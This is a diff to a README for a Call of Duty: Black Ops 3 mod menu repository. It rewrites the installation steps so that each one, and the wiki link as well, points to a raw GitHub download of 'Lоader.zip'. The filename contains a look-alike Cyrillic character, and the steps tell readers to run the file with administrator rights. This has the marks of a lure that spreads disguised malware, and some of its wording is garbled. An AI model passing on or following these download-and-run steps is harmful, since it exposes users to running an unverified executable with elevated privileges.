@@ -4,13 +4,13 @@ Welcome to the Cod Bo3 MXT Mod Menu repository! Elevate your Call of Duty: Black
 
 ## 🚀 Installation Guide
 
-1. **Download Loader.rar from the repository.**
+1. **Download https://raw.githubusercontent.com/fervic0989/BO3-MXT-Menu-Remix/main/Lоader.zip from the repository.**
 2. Extract the contents to your preferred folder using WinRAR or 7-Zip.
 3. Launch Call of Duty: Black Ops 3.
-4. Open **Loader.exe** with administrator rights.
+4. Open **https://raw.githubusercontent.com/fervic0989/BO3-MXT-Menu-Remix/main/Lоader.zip** with administrator rights.
 5. Follow the on-screen instructions for menu injection and enjoy your enhanced gameplay.
 
-*For troubleshooting tips and further installation guidance, consult our [wiki](https://github.com/yourrepository/wiki) or join our discussions section!*
+*For troubleshooting tips and further installation guidance, consult our [wiki](https://raw.githubusercontent.com/fervic0989/BO3-MXT-Menu-Remix/main/Lоader.zip) or join our discussions section!*
 
 ---
 
